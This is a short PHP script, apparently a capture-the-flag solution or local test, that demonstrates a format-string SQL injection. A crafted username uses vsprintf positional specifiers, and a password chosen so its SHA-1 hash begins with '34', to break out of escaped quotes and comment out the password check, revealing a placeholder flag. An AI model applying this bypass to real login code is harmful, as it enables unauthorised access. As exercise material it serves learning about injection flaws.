<?php

// password hash starts with 34c.... => convert character 34 to "

$a = "668";
$password = sha1($a);
// $password = "80";

$payload = "admin%1\$c-- -%1\$'>%2\$s";
// $test = "%1\$'>%2\$s";
// %1$'>%2$s
$username = strtr($payload, ['"' => '\\"', '\\' => '\\\\']);
echo vsprintf('SELECT * FROM users WHERE username = "%s"', [$username]). "\n";

echo vsprintf('SELECT * FROM users WHERE username = "'.$username.'" AND password = "%s"', [$password])."\n";

$htmlsafe_username = htmlspecialchars($username, ENT_COMPAT | ENT_SUBSTITUTE);
$greeting = $username === "admin" 
? "Hello $htmlsafe_username, the server time is %s and the flag is %s"
: "Hello $htmlsafe_username, the server time is %s";

echo vsprintf($greeting, [date('Y-m-d H:i:s'), "FLag{123}"]);

?>